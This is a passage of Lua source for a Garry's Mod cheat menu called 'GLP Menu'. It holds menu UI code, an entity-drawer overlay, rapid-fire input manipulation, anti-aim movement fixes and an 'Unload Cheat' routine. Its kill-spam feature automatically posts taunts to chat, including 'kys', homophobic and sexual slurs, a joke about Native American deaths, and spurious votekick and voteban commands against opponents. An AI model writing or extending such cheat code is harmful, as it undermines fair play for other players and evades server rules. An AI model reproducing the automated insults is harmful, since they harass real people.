	surface.SetTextColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	surface.SetTextPos(5 + posx + 15 + 5, 61 + posy + maxy)
	local tw, th = surface.GetTextSize(var[1])
	surface.DrawText(var[1])
	surface.SetDrawColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), 150)
	surface.DrawOutlinedRect(25 + posx + dist, 61 + posy + maxy, size, 16)
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(mx + 25 + posx + dist, my + 61 + posy + maxy, mx + 25 + posx + dist + size, my + 61 + posy + maxy + 16)
	local check = dist..posy..posx..w..h..maxy
	if(bMouse || notyetselected == check) then
		surface.DrawRect(25 + posx + dist + 2, 61 + posy + maxy + 2, size - 4, 12)
	end
	local tw, th = surface.GetTextSize(curopt)
	surface.SetTextPos(25 + posx + dist + 5, 61 + posy + maxy + 6 - th / 2 + 2)
	surface.DrawText(curopt)
	if(bMouse && input.IsMouseDown(MOUSE_LEFT) && !drawlast && !mousedown || notyetselected == check) then
		notyetselected = check
		drawlast = function()
			local maxy2 = 16
			for k, v in next, var[4] do
				surface.SetDrawColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), 50)
				surface.DrawRect(25 + posx + dist, 61 + posy + maxy + maxy2, size, 16)
				local bMouse2 = MouseInArea(mx + 25 + posx + dist, my + 61 + posy + maxy + maxy2, mx + 25 + posx + dist + size, my + 61 + posy + maxy + 16 + maxy2)
				if(bMouse2) then
					surface.SetDrawColor(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), 100)
					surface.DrawRect(25 + posx + dist, 61 + posy + maxy + maxy2, size, 16)
				end
				local tw, th = surface.GetTextSize(v)
				surface.SetTextPos(25 + posx + dist + 5, 61 + posy + maxy + 6 - th / 2 + 2 + maxy2)
				surface.DrawText(v)
				maxy2 = maxy2 + 16
				if(bMouse2 && input.IsMouseDown(MOUSE_LEFT) && !mousedown) then
					var[3] = v
					notyetselected = nil
					drawlast = nil
					return
				end
			end
			local bbMouse = MouseInArea(mx + 25 + posx + dist, my + 61 + posy + maxy, mx + 25 + posx + dist + size, my + 61 + posy + maxy + maxy2)
			if(!bbMouse && input.IsMouseDown(MOUSE_LEFT) && !mousedown) then
				 notyetselected = nil
				 drawlast = nil
				 return
			end
		end
	end
end

local function DrawUnloadButton(self, w, h)
	local curcol = Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:"))
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(mx + 910, my + h - 50, mx + 965, my + h - 50 + 30)
	if(bMouse) then
			curcol = Color(gInt("Home", "Main Text Color", "Red:") + 60, gInt("Home", "Main Text Color", "Green:") + 60, gInt("Home", "Main Text Color", "Blue:") + 60, gInt("Home", "Others", "T Opacity:"))
	end
	for i = 0, 0 do
			surface.SetDrawColor(curcol)
			surface.DrawLine(910, h - 50 + i, 1020, h - 50 + i)
			for k, v in next, curcol do
					curcol[k] = curcol[k] - 2
			end
	end
	surface.SetFont("MenuFont")
	surface.SetTextColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 255)
	local tw, th = surface.GetTextSize("Unload")
	surface.SetTextPos(847 + 100 - tw / 2, h - 50 + 15 - th / 2)
	surface.DrawText("Unload Cheat")
	if bMouse and input.IsMouseDown(MOUSE_LEFT) then
		unloaded = true
		hook.Remove("RenderGLPne", "Hook1")
		hook.Remove("PostDrawViewModel", "Hook2")
		hook.Remove("PreDrawEffects", "Hook3")
		hook.Remove("HUDShouldDraw", "Hook4")
		hook.Remove("Think", "Hook5")
		hook.Remove("Think", "Hook6")
		hook.Remove("Think", "Hook7")
		hook.Remove("Think", "Hook8")
		hook.Remove("PreDrawSkyBox", "Hook9")
		hook.Remove("PreDrawViewModel", "Hook10")
		hook.Remove("PreDrawPlayerHands", "Hook11")
		hook.Remove("RenderScreenspaceEffects", "Hook12")
		hook.Remove("DrawOverlay", "Hook13")
		hook.Remove("player_hurt", "Hook14")
		hook.Remove("entity_killed", "Hook15")
		hook.Remove("Move", "Hook16")
		hook.Remove("CreateMove", "Hook17")
		hook.Remove("AdjustMouseSensitivity", "Hook18")
		hook.Remove("ShouldDrawLocalPlayer", "Hook19")
		hook.Remove("CalcView", "Hook20")
		hook.Remove("player_disconnect", "Hook21")
		hook.Remove("HUDPaint", "Hook22")
		hook.Remove("PreDrawOpaqueRenderables", "Hook23")
		hook.Remove("OnPlayerChat", "Hook24")
		me:ConCommand("M9KGasEffect 1 cl_interp 0 cl_interp_ratio 2 cl_updaterate 30")
		bSendPacket = true
		_G.Loaded = false
		timer.Create("ChatPrint", 0.1, 1, function() MsgG(2.5, "System Successfully unloaded GLP Menu.") end)
		timer.Create("PlaySound", 0.1, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
	end
end

local function DrawCloseButton(self, w, h)
	local curcol = Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:"))
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(mx + 980, my + h - 50, mx + 1075, my + h - 50 + 30)
	if(bMouse) then
		curcol = Color(gInt("Home", "Main Text Color", "Red:") + 60, gInt("Home", "Main Text Color", "Green:") + 60, gInt("Home", "Main Text Color", "Blue:") + 60, gInt("Home", "Others", "T Opacity:"))
	end
	for i = 0, 0 do
		surface.SetDrawColor(curcol)
		surface.DrawLine(980, h - 50 + i, 1075, h - 50 + i)
		for k, v in next, curcol do
			curcol[k] = curcol[k] - 2
		end
	end
	surface.SetFont("MenuFont")
	surface.SetTextColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 255)
	local tw, th = surface.GetTextSize("Close Menu")
	surface.SetTextPos(930 + 100 - tw / 2, h - 50 + 15 - th / 2)
	surface.DrawText("Exit")
	if(bMouse && input.IsMouseDown(MOUSE_LEFT)) then
		CloseMenu()
		surface.PlaySound("buttons/lightswitch2.wav")
	end
end

local added = {}

local function BadEntities(v)
	if string.find(v:GetClass(), "grav") or string.find(v:GetClass(), "phys") or string.find(v:GetClass(), "class") or string.find(v:GetClass(), "viewmodel") or string.find(v:GetClass(), "worldspawn") or string.find(v:GetClass(), "dynamic") or string.find(v:GetClass(), "beam") or string.find(v:GetClass(), "keys") or string.find(v:GetClass(), "pocket") or string.find(v:GetClass(), "prop_") or string.find(v:GetClass(), "gmod_") or string.find(v:GetClass(), "env_") or string.find(v:GetClass(), "func_") or string.find(v:GetClass(), "manipulate_") then
		return false
	else
		return true
	end
end

local function EntityFinder()
	local finder = vgui.Create("DFrame")
	finder:SetSize(1110, 742)
	finder:Center()
	finder:SetTitle("")
	finder:MakePopup()
	finder:ShowCloseButton(false)
	local ent_list = vgui.Create("DListView", finder)
	ent_list:SetPos(192, 75)
	ent_list:SetSize(300, 500)
	ent_list:SetMultiSelect(false)
	ent_list:AddColumn("Existing entities"):SetFixedWidth(300)
	local draw_list = vgui.Create("DListView", finder)
	draw_list:SetPos(632, 75)
	draw_list:SetSize(300, 500)
	draw_list:SetMultiSelect(false)
	draw_list:AddColumn("Drawn entities"):SetFixedWidth(300)
	local add = vgui.Create("DButton", finder)
	add:SetText(">>")
	add:SetPos(512, 250)
	add:SetSize(100, 30)
	add.DoClick = function()
	timer.Create("PlaySound", 0.1, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
		if ent_list:GetSelectedLine() ~= nil then 
			local ent = ent_list:GetLine(ent_list:GetSelectedLine()):GetValue(1)
			if not table.HasValue(drawn_ents, ent) then 
				table.insert(drawn_ents, ent)
				ent_list:RemoveLine(ent_list:GetSelectedLine())
				draw_list:AddLine(ent)
			end
		end
	end
	local remove = vgui.Create("DButton", finder)
	remove:SetText("<<")
	remove:SetPos(512, 300)
	remove:SetSize(100, 30)
	remove.DoClick = function()
	timer.Create("PlaySound", 0.1, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
		if draw_list:GetSelectedLine() ~= nil then
			local ent = draw_list:GetLine(draw_list:GetSelectedLine()):GetValue(1)
			if table.HasValue(drawn_ents, ent) then 
				for k, v in next, drawn_ents do 
					if v == ent then 
						table.remove(drawn_ents, k) 
					end 
				end
				draw_list:RemoveLine(draw_list:GetSelectedLine())
				ent_list:AddLine(ent)
			end
		end
	end
	local refresh = vgui.Create("DButton", finder)
	refresh:SetText("Refresh")
	refresh:SetPos(512, 350)
	refresh:SetSize(100, 30)
	refresh.DoClick = function()
	timer.Create("PlaySound", 0.1, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
		ent_list:Clear()
		draw_list:Clear()
		for k, v in next, ents.GetAll() do
			if not table.HasValue(added, v:GetClass()) and not table.HasValue(drawn_ents, v:GetClass()) and BadEntities(v) and v:GetClass() ~= "player" then
				ent_list:AddLine(v:GetClass())
			end
		end
		table.sort(added)
		for k, v in next, added do
			ent_list:AddLine(v)
		end
		table.sort(drawn_ents)
		for k, v in next, drawn_ents do
			draw_list:AddLine(v)
		end
	end
	local add_custom = vgui.Create("DTextEntry", finder)
	add_custom:SetPos(712, 600)
	add_custom:SetSize(140, 20)
	add_custom:SetText("")
	local add_custom_button = vgui.Create("DButton", finder)
	add_custom_button:SetText("Add")
	add_custom_button:SetPos(857, 600)
	add_custom_button:SetSize(60, 20)
	add_custom_button.DoClick = function()
	timer.Create("PlaySound", 0.1, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
		local ent = add_custom:GetValue()
		if not table.HasValue(drawn_ents, ent) then 
			table.insert(drawn_ents, ent)
			draw_list:AddLine(ent)
		end
	end
	local find = vgui.Create("DTextEntry", finder)
	find:SetPos(272, 600)
	find:SetSize(140, 20)
	find:SetText("")
	find.OnChange = function()
		if find:GetValue() ~= "" then
			ent_list:Clear()
			for k, v in next, ents.GetAll() do
				if string.find(v:GetClass(), find:GetValue()) and not table.HasValue(added, v:GetClass()) and not table.HasValue(drawn_ents, v:GetClass()) and BadEntities(v) and v:GetClass() ~= "player" then
					ent_list:AddLine(v:GetClass())
				end
			end
		else
			ent_list:Clear()
			for k, v in next, ents.GetAll() do
				if not table.HasValue(added, v:GetClass()) and not table.HasValue(drawn_ents, v:GetClass()) and BadEntities(v) and v:GetClass() ~= "player" then
					ent_list:AddLine(v:GetClass())
				end
			end
			table.sort(added)
			for k, v in next, added do
				ent_list:AddLine(v)
			end
		end
	end
	local find_button = vgui.Create("DButton", finder)
	find_button:SetText("Search")
	find_button:SetPos(417, 600)
	find_button:SetSize(60, 20)
	find_button.DoClick = function()
	timer.Create("PlaySound", 0.1, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
		if find:GetValue() ~= "" then
			ent_list:Clear()
			for k, v in next, ents.GetAll() do
				if not table.HasValue(added, v:GetClass()) and not table.HasValue(drawn_ents, v:GetClass()) and BadEntities(v) and v:GetClass() ~= "player" then
					ent_list:AddLine(v:GetClass())
				end
			end
		end
	end
	finder.Paint = function(self, w, h)
		draw.RoundedBox(gInt("Home", "Others", "Roundness:"), 0, 0, w, h, Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:")))
		DrawUpperText(w, h)
		DrawUnloadButton(self, w, h)
		DrawCloseButton(self, w, h)
		draw.SimpleText("Search Entity:", "MenuFont", 192, 610, Color(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:")), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
		draw.SimpleText("Add Entity:", "MenuFont", 642, 610, Color(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:")), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end
	ent_list.Paint = function(self, w, h)
		draw.RoundedBox(15, 0, 0, w, h, Color(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
	end
	draw_list.Paint = function(self, w, h)
		draw.RoundedBox(15, 0, 0, w, h, Color(gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
	end
	for k, v in next, ents.GetAll() do
		if not table.HasValue(added, v:GetClass()) and not table.HasValue(drawn_ents, v:GetClass()) and BadEntities(v) and v:GetClass() ~= "player" then
			ent_list:AddLine(v:GetClass())
		end
	end
	table.sort(added)
	for k, v in next, added do
		ent_list:AddLine(v)
	end
	table.sort(drawn_ents)
	for k, v in next, drawn_ents do
		draw_list:AddLine(v)
	end
	function CloseMenu()
		finder:Remove()
		menuopen = false
		candoslider = false
		drawlast = nil
	end
	finder.Think = function()
		if ((input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_F5)) and not menukeydown2 or unloaded == true) then
			finder:Remove()
			file.Write(folder.."/entities.txt", util.TableToJSON(drawn_ents))
			menuopen = false
			candoslider = false
			drawlast = nil
		end
	end
end

local function DrawEntitiesButton(self, w, h)
	local curcol = Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:"))
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(mx + 683, my + h - 50, mx + 785, my + h - 50 + 30)
	if(bMouse) then
		curcol = Color(gInt("Home", "Main Text Color", "Red:") + 60, gInt("Home", "Main Text Color", "Green:") + 60, gInt("Home", "Main Text Color", "Blue:") + 60, gInt("Home", "Others", "T Opacity:"))
	end
	for i = 0, 0 do
		surface.SetDrawColor(curcol)
		surface.DrawLine(683, h - 50 + i, 785, h - 50 + i)
		for k, v in next, curcol do
			curcol[k] = curcol[k] - 2
		end
	end
	surface.SetFont("MenuFont")
	surface.SetTextColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 255)
	local tw, th = surface.GetTextSize("Entities Menu")
	surface.SetTextPos(683 + 50 - tw / 2, h - 50 + 15 - th / 2)
	surface.DrawText("Entity Drawer")
	if(bMouse && input.IsMouseDown(MOUSE_LEFT)) then
		self:Remove()
		EntityFinder()
		timer.Create("PlaySound", 0.1, 1, function() surface.PlaySound("buttons/lightswitch2.wav") end)
	end
end

local function LineDrawSand(self, w, h, k, var)
	local opt, posx, posy, sizex, sizey, dist = var[1][1], var[1][2], var[1][3], var[1][4], var[1][5], var[1][6]
	surface.SetDrawColor(gInt("Home", "Border Color", "Red:"), gInt("Home", "Border Color", "Green:"), gInt("Home", "Border Color", "Blue:"), gInt("Home", "Others", "B Opacity:"))
	local startpos = 61 + posy
	surface.SetTextColor(gInt("Home", "Border Color", "Red:"), gInt("Home", "Border Color", "Green:"), gInt("Home", "Border Color", "Blue:"), gInt("Home", "Others", "B Opacity:"))
	surface.SetFont("MenuFont")
	local tw, th = surface.GetTextSize(opt)
	surface.DrawLine(5 + posx, startpos, 5 + posx + 15, startpos)
	surface.SetTextPos(5 + posx + 15 + 5, startpos - th / 2)
	surface.DrawLine(5 + posx + 15 + 5 + tw + 5, startpos, 5 + posx + sizex, startpos)
	surface.DrawLine(5 + posx, startpos, 5 + posx, startpos + sizey)
	surface.DrawLine(5 + posx, startpos + sizey, 5 + posx + sizex, startpos + sizey)
	surface.DrawLine(5 + posx + sizex, startpos, 5 + posx + sizex, startpos + sizey)
	surface.DrawText(opt)
	local maxy = 15
	for k, v in next, var do
		if(k == 1) then continue end
			if(v[2] == "Checkbox") then
					DrawCheckbox(self, w, h, v, maxy, posx, posy, dist)
			elseif(v[2] == "Slider") then
					DrawSlider(self, w, h, v, maxy, posx, posy, dist)
			elseif(v[2] == "Selection") then
					DrawSelect(self, w, h, v, maxy, posx, posy, dist)
				end
		maxy = maxy + 25
	end
end

local function DrawSub(self, w, h)
	for k, v in next, visible do
		if(!v) then continue end
		for _, var in next, options[k] do
			LineDrawSand(self, w, h, k, var)
		end
	end
end

local function Menu()
	local frame = vgui.Create("DFrame")
	frame:SetSize(1110, 800)
	frame:Center()
	frame:SetTitle("")
	frame:MakePopup()
	frame:ShowCloseButton(false)
	if(gConn("Extra", "Extra", "Turn on Music")) then
		RunConsoleCommand("stopsound")
	GLPBot.sound.PlayURL(menusongs[math.random(#menusongs)], "mono", function(station)
		if (GLPBot.IsValid(station)) then
			station:Play()
			end
		end)
	end
	if(gConn("Extra", "Extra", "Reset Sounds")) then
		RunConsoleCommand("stopsound")
	end
	frame.Paint = function(self, w, h)
			if(candoslider and not mousedown and not drawlast and not input.IsMouseDown(MOUSE_LEFT)) then
				candoslider = false
			end
			draw.RoundedBox(gInt("Home", "Others", "Roundness:"), 0, 0, w, h, Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:")))
			DrawUpperText(w, h)
			DrawOptions(self, w, h)
			DrawSub(self, w, h)
			DrawUnloadButton(self, w, h)
			DrawCloseButton(self, w, h)
			DrawEntitiesButton(self, w, h)
			if(drawlast) then
					drawlast()
					candoslider = true
			end
			mousedown = input.IsMouseDown(MOUSE_LEFT)
	end
	function CloseMenu()
		frame:Remove()
		menuopen = false
		candoslider = false
		drawlast = nil
	end
	frame.Think = function()
		if ((input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_F6)) and not menukeydown2 or unloaded == true) then
			frame:Remove()
			menuopen = false
			candoslider = false
			drawlast = nil
		end
	end
end

local function NoCam()
	if gConn("FakeAngles", "FAKEAngles)", "Enabled") or gConn("Extra", "Extra", "Thirdperson") or not me:Alive() or me:Health() < 1 then
		return false
	end
	if me:GetActiveWeapon():IsValid() and me:GetActiveWeapon():GetClass() == "gmod_camera" then
		return true
	else
		return false
	end
end

local function NoPhys()
	if gConn("FakeAngles", "FAKEAngles)", "Enabled") or gConn("Extra", "Extra", "Thirdperson") or not me:Alive() or me:Health() < 1 then
		return false
	end
	if me:GetActiveWeapon():IsValid() and me:GetActiveWeapon():GetClass() == "weapon_physgun" then
		return true
	else
		return false
	end
end

local toggler = 0

local function RapidFire(pCmd)
	if(gConn("Aimbot", "WeaponJacker", "DoubleTap")) then
	local wep = pm.GetActiveWeapon(me)
		if pm.KeyDown(me, IN_ATTACK) then
			if (em.Health(me) > 0) then
				if not NoPhys() and not NoCam() then
					if toggler == 0 then
						cm.SetButtons(pCmd, bit.bor(cm.GetButtons(pCmd), IN_ATTACK))
						toggler = 1
					else
						cm.SetButtons(pCmd, bit.band(cm.GetButtons(pCmd), bit.bnot(IN_ATTACK)))
						toggler = 0
					end
				end
			end
		end
	end
end

toggler = 0

local function RapidAltFire(pCmd)
	if(gConn("Aimbot", "WeaponJacker", "Rapid Alt Fire")) then
	local wep = pm.GetActiveWeapon(me)
		if pm.KeyDown(me, IN_ATTACK) then
			if (em.Health(me) > 0) then
				if not NoPhys() and not NoCam() then
					if toggler == 0 then
						cm.SetButtons(pCmd, bit.bor(cm.GetButtons(pCmd), IN_ATTACK2))
						toggler = 1
					else
						cm.SetButtons(pCmd, bit.band(cm.GetButtons(pCmd), bit.bnot(IN_ATTACK2)))
						toggler = 0
					end
				end
			end
		end
	end
end

local playerkills = 0

local function KillSpam(data)
	local killer = Entity(data.entindex_attacker)
	local killed = Entity(data.entindex_killed)
	if not killer:IsValid() or not killed:IsValid() or not killer:IsPlayer() or not killed:IsPlayer() then return end
	
	if table.HasValue(ignore_list, killed:UniqueID()) then
		return false
	end
	
	if table.HasValue(ignore_list, killer:UniqueID()) then
		return false
	end

local playerphrases = {
	"Owned", 
	"Bodied", 
	"REKT", 
	"Downed", 
	"Destroyed", 
	"Annihilated", 
	"Decimated", 
	"Wrecked", 
	"Demolished", 
	"Smacked", 
	"Ruined", 
	"Murdered", 
	"DEMOLISHED", 
	"Slaughtered", 
	"Slapped!", 
	"DumpsterFired", 
	"Executed", 
	"Bamboozled", 
	"GLP'd", 
}

local excuses = {
	"i lagged out...", 
	"bad ping wtf", 
	"lol wasnt looking at you", 
	"was alt tabbed", 
	"Pure LUCK", 
	"wow", 
	"nice one", 
	"BRUH YOU HACKING?", 
	"My Turtle Broke my Keyboard!?!", 
	"my dog was on the keyboard", 
	"my fps is trash", 
	"MY COMPUTER IS A POTATOE", 
	"ouch", 
	"ITS THIS SERVER ITS CRASHING!", 
	"ok", 
}

local hvhexcuses = {
	"forgot to press aimkey lol", 
	"give me a minute...LAGG", 
	"My Cheats Glitching...", 
	"lol my hvh Home are gone, wait", 
	"luck lol", 
	"my fps is DYING", 
	"my ping is trash", 
	"what are you using?", 
}

local hvhexcuses2 = {
	"Ok", 
	"Nice", 
	"Lucky", 
	"Sorry, bad aa", 
	"My configs suck", 
	"I suck at HvH", 
	"What are you using?", 
	"I'm using a REALLY BAD cheat", 
}

local reason = {
	"bad at game", 
	"spawnkilling", 
	"hacker", 
	"hacking", 
	"hack", 
	"bad", 
	"slammed", 
}

local reason2 = {
	"hacker", 
	"spawnkiller", 
	"propkiller", 
	"rdm", 
	"being annoying", 
	"bad at the game", 
	"Trash", 
	"is dumb", 
}

local bantime = {
	"1", 
	"2", 
	"3", 
	"4", 
	"5", 
	"6", 
	"7", 
	"8", 
	"9", 
	"10", 
	"20", 
	"30", 
	"40", 
	"50", 
	"60", 
	"70", 
	"80", 
	"90", 
	"100", 
	"200", 
	"300", 
	"400", 
	"500", 
	"600", 
	"700", 
	"800", 
	"900", 
	"1000", 
	"2000", 
	"3000", 
	"4000", 
	"5000", 
	"6000", 
	"7000", 
	"8000", 
	"9000", 
	"10000", 
	"20000", 
	"30000", 
	"40000", 
	"50000", 
	"60000", 
	"70000", 
	"80000", 
	"90000", 
	"100000", 
	"200000", 
	"300000", 
	"400000", 
	"500000", 
	"600000", 
	"700000", 
	"800000", 
	"900000", 
	"1000000", 
	"999999999", 
}

local randomoption = { 
	"likes_penis", 
	"eats_Poo", 
	"is_gay", 
	"is_a_Sucker", 
	"should_get_kicked", 
	"Weird_Fellow", 
	"thinks_about_penis_all_day", 
	"Is_Dumb", 
	"is_a_CrazyPerson", 
}

local owned = {
	killed:Nick().." is so poopy head", 
	"can you stop dying, "..killed:Nick().."?", 
	"hey, "..killed:Nick().."? it's okay, try again next time!", 
	"what the fuck was that "..killed:Nick().."?", 
	"plan your next try in the rFakeAnglesawn room!", 
	"rekt", 
	"owned", 
	"lol", 
	"Nice Try, "..killed:Nick(), 
	"there you go, back to the rFakeAnglesawn", 
	"you're bad, " ..killed:Nick(), 
	"noob down", 
	"FUNNY", 
	killed:Nick().." has died Extra times than native americans did back in the 1800's", 
	"i bet you're insecure about your aim", 
	"ahahah", 
	"excuse me "..killed:Nick()..", you have won the world record of the worst KD in history! Just kidding", 
	"there he goes back to the rFakeAnglesawn room", 
	"don't let the door hit you on the way out, "..killed:Nick().."!", 
	"noob", 
	killed:Nick().." is a noob", 
	"nerd", 
	"pff", 
	"ha", 
	"ez", 
	killed:Nick().." is a nerd", 
	"good job!", 
	"try not to die next time, "..killed:Nick().."!", 
	"!votekick "..killed:Nick().." "..reason[math.random(#reason)], 
	"!voteban "..killed:Nick().." 9999 "..reason[math.random(#reason)], 
	"!vote "..killed:Nick().."... "..randomoption[math.random(#randomoption)].." "..randomoption[math.random(#randomoption)].." "..randomoption[math.random(#randomoption)], 
}

local votekick = {
	"!votekick "..killed:Nick().." "..reason2[math.random(#reason2)], 
}

local voteban = {
	"!voteban "..killed:Nick().." "..bantime[math.random(#bantime)].." "..reason2[math.random(#reason2)], 
}

local hvhowned = {
	"sick cheat, "..killed:Nick().."!", 
	"get REKT", 
	"rekt", 
	"owned", 
	"did you get that garbage from the steam workshop?", 
	"ha", 
	"ez", 
	"loser", 
	"take this L", 
	"\"GLP Menu RULES!!\" - "..killed:Nick(), 
	killed:Nick()..": LOL WHAT ARE YOU USING??? I WANT THAT NOT", 
	"noob", 
	"nerd", 
	"pff", 
	"gj", 
	"how can a cheat suck this hard?", 
	"nice strategy", 
	"nice move", 
	"LOL, "..killed:Nick(), 
	"what are u using?"..killed:Nick().."?", 
}

local hvh2 = {
	"Hey, "..killed:Nick()..", stop using that awful menu and get GLP Menu oh wait you cant :)", 
	""..killed:Nick().." just got owned by GLP Menu", 
	"THIS IS A CUSTOM MENU DESTROYING EVERYTHING", 
	"Get WRECKED", 
	"Don't stay too much inside the rFakeAnglesawn room, "..killed:Nick().."!", 
	"You have been tapped by GLP", 
	"Get GLPBot before trying to HvH, "..killed:Nick(), 
	"GLPBot owns you", 
}


if(gOption("Extra", "Chat", "Kill Spam:") == "Normal") then
	if(killed == me and killer ~= me) then
		if not me:Alive() or me:Health() < 1 then return end
			RunConsoleCommand("say", string.format(excuses[math.random(#excuses)], killed:Nick()))
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		RunConsoleCommand("say", owned[math.random(#owned)])
	end
	if(gOption("Extra", "Chat", "Kill Spam:") == "Insult") then
		if(killed == me and killer ~= me) then
			RunConsoleCommand("say", comebackexcuses[math.random(#comebackexcuses)])
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		RunConsoleCommand("say", comebackowned[math.random(#comebackowned)])
	end
	if(gOption("Extra", "Chat", "Kill Spam:") == "HvH") then
		if(killed == me and killer ~= me) then
			RunConsoleCommand("say", hvhexcuses[math.random(#hvhexcuses)])
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		RunConsoleCommand("say", hvhowned[math.random(#hvhowned)])
	end
	if(gOption("Extra", "Chat", "Kill Spam:") == "GLP Menu HvH") then
		if(killed == me and killer ~= me) then
			RunConsoleCommand("say", hvhexcuses2[math.random(#hvhexcuses2)])
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		RunConsoleCommand("say", hvh2[math.random(#hvh2)])
	end
	if(gOption("Extra", "Chat", "Kill Spam:") == "Votekick") then
		if(killed == me and killer ~= me) then
			RunConsoleCommand("say", votekick[math.random(#votekick)])
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		RunConsoleCommand("say", votekick[math.random(#votekick)])
	end
	if(gOption("Extra", "Chat", "Kill Spam:") == "Voteban") then
		if(killed == me and killer ~= me) then
			RunConsoleCommand("say", voteban[math.random(#voteban)])
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		RunConsoleCommand("say", voteban[math.random(#voteban)])
	end
	if(gOption("Extra", "Chat", "Kill Spam:") == "Salty") then
		if(killed == me and killer ~= me) then
			RunConsoleCommand("say", "kys")
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		RunConsoleCommand("say", "ez")
	end
	if(gOption("Extra", "Chat", "Kill Spam:") == "Killstreak") then
		if(killed == me && playerkills > 0 && killer ~= me) then
		RunConsoleCommand("say", ""..killed:Nick().."'s ".."killstreak of "..playerkills.." has been ended by "..killer:Nick()..".")
		playerkills = 0
		end
		if(!em.IsValid(killer) || !em.IsValid(killed) || killer != me || killer == killed || !killed:IsPlayer()) then
			return
		end
		playerkills = playerkills + 1
		RunConsoleCommand("say", ""..playerphrases[math.random(#playerphrases)].." "..killed:Nick().." (".."Killstreak: "..playerkills..")")
	end
end

local fa

local aa

local function FixMovement(pCmd)
	local vec = Vector(cm.GetForwardMove(pCmd), cm.GetSideMove(pCmd), 0)
	local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
	local mang = vm.Angle(vec)
	local yaw = cm.GetViewAngles(pCmd).y - fa.y + mang.y
	if (((cm.GetViewAngles(pCmd).p + 90)%360) > 180) then
	yaw = 180 - yaw
	end
	yaw = ((yaw + 180)%360) - 180
	pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
	pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end

local function Clamp(val, min, max)
    if(val < min) then
        return min
    elseif(val > max) then
            return max
        end
    return val
end

local function NormalizeAngle(ang)
	if not NoPhys() and not NoCam() then
		ang.x = math.NormalizeAngle(ang.x)
		ang.p = math.Clamp(ang.p, - 89, 89)
	end
end

local function DrawOutlinedText (title, font, x, y, color, OUTsize, OUTcolor)
	draw.SimpleTextOutlined (title, font, x, y, color, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, OUTsize, OUTcolor)
end

local function EntityName()
	if util.TraceLine(util.GetPlayerTrace(me)).Entity:IsValid() then
		return util.TraceLine(util.GetPlayerTrace(me)).Entity:GetClass()
	else
		return "None"
	end
end

local function Logo()
